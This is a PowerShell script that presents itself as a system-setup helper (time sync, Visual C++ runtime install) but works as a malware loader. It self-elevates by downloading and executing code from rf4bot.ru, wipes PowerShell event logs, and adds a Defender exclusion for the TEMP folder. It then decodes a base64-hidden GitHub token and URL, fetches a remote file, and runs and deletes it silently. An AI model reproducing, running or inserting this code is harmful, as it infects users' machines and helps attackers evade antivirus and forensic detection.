function Ensure-RunAsAdmin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        $scriptPath = $MyInvocation.MyCommand.Definition
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr rf4bot.ru/nemo)`""

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments
        $psi.Verb = "runas"

        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Ошибка запуска с правами администратора."
            Exit 1
        }
    }
}

Function Sync-LocalTime {
    param(
        [Parameter(Mandatory=$false)]
        [string]$NtpServer = "time.windows.com"
    )

    try {
        w32tm /config /manualpeerlist:"$NtpServer" /syncfromflags:MANUAL /update
    }
    catch {
    }

    try {
        Stop-Service w32time -ErrorAction Stop
        Start-Service w32time -ErrorAction Stop
    }
    catch {
    }

    try {
        w32tm /resync /force
    }
    catch {
    }
}

cls
Ensure-RunAsAdmin
Sync-LocalTime -NtpServer "time.windows.com"
cls
function Set-RegistryValue {
    param (
        [string]$Path = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main",
        [string]$Name = "DisableFirstRunCustomize",
        [int]$Value = 2
    )

    try {
        Set-ItemProperty -Path $Path -Name $Name -Value $Value
    } catch {
    }
}

Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
}

$temp = $env:TEMP

$systemPath = "$env:SystemRoot\System32";
$file1 = "$systemPath\msvcp140.dll";
$file2 = "$systemPath\vcruntime140_1.dll";
$file3 = "$systemPath\vcruntime140.dll";
$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);

try	{
	if (!$redistCheck)
	{
		$redistFilePath = "$temp\VC_redist.x64.exe"
		try
		{
			Remove-Item $redistFilePath -ErrorAction Ignore;
		}
		catch {}
		try
		{
			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
		} catch {
		}
		try
		{
			Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
			Remove-Item $redistFilePath -ErrorAction Ignore;
		} catch {
		}
	}

    $contFile = [System.IO.Path]::GetTempFileName()
	try { Add-MpPreference -ExclusionPath $temp -ErrorAction Stop } catch {	}

    try {		
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGVlSUViUWhPTkZsUF81aWFPeXBLV3ZCR3BLU3NPa1FPSnRLU3RBYng5bmJHVkdtQW5FY2xBNmJHT0gyMkZZRElHTDlqdnVHRw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
        $Url = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy94c2RlbWVudGV2eC9fL2NvbnRlbnRzL19f"
        $Url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Url))
		$q = '"'
		$h = @{
			"Authorization"  = "$String"
			"Cache-Control"  = "no-cache"
		}
        $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
		Invoke-WebRequest $response.download_url -OutFile $contFile 
        if (Test-Path $contFile) {
			try {
				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c `"$contFile`" && del `"$contFile`""
			} catch {
				Start-Sleep -s 3
			}
        } else {
            Start-Sleep -s 3
        }
    } catch {
        Start-Sleep -s 3
    }


} finally {
	Set-RegistryValue
}

exit
